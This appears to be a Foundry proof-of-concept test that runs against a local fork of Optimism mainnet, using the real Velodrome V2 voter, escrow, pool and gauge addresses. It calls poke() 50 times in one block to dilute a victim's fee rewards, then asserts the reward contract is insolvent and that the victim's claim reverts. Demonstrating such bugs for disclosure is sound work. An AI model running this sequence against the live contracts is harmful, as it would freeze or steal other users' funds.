// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IVoter {
    function gaugeToFees(address gauge) external view returns (address);
    function gauges(address pool) external view returns (address);
    function vote(uint256 tokenId, address[] calldata pools, uint256[] calldata weights) external;
    function poke(uint256 tokenId) external;
}

interface IVotingEscrow {
    function token() external view returns (address);
    function create_lock(uint256 value, uint256 lock_duration) external returns (uint256);
}

interface IReward {
    function rewards(uint256 index) external view returns (address);
    function earned(address token, uint256 tokenId) external view returns (uint256);
    function getReward(uint256 tokenId, address[] memory tokens) external;
    function notifyRewardAmount(address token, uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract VelodromeRewardInflationPoC is Test {
    // Velodrome V2 Addresses on Optimism
    IVoter voter = IVoter(0x41C914ee0c7E1A5edCD0295623e6dC557B5aBf3C);
    IVotingEscrow ve = IVotingEscrow(0xFAf8FD17D9840595845582fCB047DF13f006787d);

    address pool = 0x485a5F920b708e705Ff239C1b54aE4e3194B4048; // VELO/USDC
    address gauge = 0x6eC2C8e7E651717361a9957388C83827F39C2930;

    address attacker = address(0x1337);
    address victim = address(0xDEAD);
    uint256 attackerTokenId;
    uint256 victimTokenId;

    function setUp() public {
        vm.createSelectFork("https://mainnet.optimism.io");

        IERC20 lockToken = IERC20(ve.token());
        deal(address(lockToken), attacker, 100_000e18);
        deal(address(lockToken), victim, 100_000e18);

        // Attacker locks tokens
        vm.startPrank(attacker);
        lockToken.approve(address(ve), 100_000e18);
        attackerTokenId = ve.create_lock(100_000e18, 4 * 365 * 86400);
        vm.stopPrank();

        // Victim locks tokens
        vm.startPrank(victim);
        lockToken.approve(address(ve), 100_000e18);
        victimTokenId = ve.create_lock(100_000e18, 4 * 365 * 86400);
        vm.stopPrank();

        // Prepare voting
        address[] memory pools = new address[](1);
        pools[0] = pool;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 1;

        vm.prank(attacker);
        voter.vote(attackerTokenId, pools, weights);
        vm.prank(victim);
        voter.vote(victimTokenId, pools, weights);
    }

    function testRewardInflationExploit() public {
        IReward feesReward = IReward(voter.gaugeToFees(gauge));
        address rewardToken = feesReward.rewards(0);
        uint256 rewardAmount = 1000e18;

        // 1. Setup initial rewards
        deal(rewardToken, gauge, rewardAmount);
        vm.startPrank(gauge);
        IERC20(rewardToken).approve(address(feesReward), rewardAmount);
        feesReward.notifyRewardAmount(rewardToken, rewardAmount);
        vm.stopPrank();

        // 2. Accrue some rewards
        vm.warp(block.timestamp + 1 days);
        uint256 victimEarnedBefore = feesReward.earned(rewardToken, victimTokenId);
        console.log("Victim earned before attack:", victimEarnedBefore);
        assertGt(victimEarnedBefore, 0);

        // 3. Execution: Attacker pokes 50 times in the same block
        vm.startPrank(attacker);
        uint256 gasBefore = gasleft();
        for (uint256 i = 0; i < 50; i++) {
            voter.poke(attackerTokenId);
        }
        console.log("Exploit gas used:", gasBefore - gasleft());
        vm.stopPrank();

        // 4. Verify dilution
        uint256 victimEarnedAfter = feesReward.earned(rewardToken, victimTokenId);
        console.log("Victim earned after attack:", victimEarnedAfter);
        assertLt(victimEarnedAfter, victimEarnedBefore / 5);

        // 5. Verify permanent corruption (insolvency in next week)
        vm.warp(block.timestamp + 7 days);
        uint256 victimEarnedMassive = feesReward.earned(rewardToken, victimTokenId);
        console.log("Victim earned after 1 week (corrupted):", victimEarnedMassive);

        uint256 contractBal = IERC20(rewardToken).balanceOf(address(feesReward));
        assertGt(victimEarnedMassive, contractBal); // Insolvency

        // 6. Attempting to claim reverts
        vm.prank(victim);
        address[] memory tokens = new address[](1);
        tokens[0] = rewardToken;
        vm.expectRevert();
        feesReward.getReward(victimTokenId, tokens);

        console.log("SUCCESS: Reward inflation proven. Victim's rewards are frozen due to insolvency.");
    }
}
